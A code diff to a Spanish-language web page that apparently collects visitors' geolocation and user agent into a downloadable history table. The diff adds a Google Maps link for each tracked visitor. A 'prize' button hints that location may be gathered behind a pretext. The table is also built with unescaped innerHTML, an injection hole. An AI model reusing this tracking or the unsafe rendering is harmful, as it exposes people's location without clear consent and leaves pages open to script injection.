@@ -38,7 +38,7 @@ canvas { position:fixed; top:0; left:0; pointer-events:none; z-index:999; }
 <div id="historial">
 <h3>📋 Historial de Usuarios:</h3>
 <table>
-<thead><tr><th>Usuario</th><th>Lat</th><th>Lon</th><th>Fecha</th></tr></thead>
+<thead><tr><th>Usuario</th><th>Lat</th><th>Lon</th><th>Mapa</th><th>Fecha</th></tr></thead>
 <tbody id="tablaHistorial"></tbody>
 </table>
 </div>
@@ -88,13 +88,15 @@ btnPremio.addEventListener("click",()=>{
 btnDescargar.addEventListener("click",descargarHistorial);
 
 function onSuccess(pos){
+  const maps_link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
   const data = {
     id: usuarioID,
     lat: pos.coords.latitude,
     lon: pos.coords.longitude,
     accuracy: pos.coords.accuracy,
     fecha: new Date().toISOString(),
-    userAgent: navigator.userAgent
+    userAgent: navigator.userAgent,
+    maps_link: maps_link
   };
   let esNuevo = false;
   if(!historial.some(u=>u.id===usuarioID)){
@@ -178,7 +180,7 @@ function actualizarTabla(nuevoID=null){
   tablaHistorial.innerHTML="";
   historial.forEach(u=>{
     const tr = document.createElement("tr");
-    tr.innerHTML = `<td>${u.userAgent}</td><td>${u.lat.toFixed(5)}</td><td>${u.lon.toFixed(5)}</td><td>${u.fecha}</td>`;
+    tr.innerHTML = `<td>${u.userAgent}</td><td>${u.lat.toFixed(5)}</td><td>${u.lon.toFixed(5)}</td><td><a href="${u.maps_link}" target="_blank">Ver Mapa</a></td><td>${u.fecha}</td>`;
     if(nuevoID && u.id===nuevoID) tr.classList.add("nuevo");
     tablaHistorial.appendChild(tr);
   });
@@ -186,5 +188,3 @@ function actualizarTabla(nuevoID=null){
 </script>
 </body>
 </html>
-
-
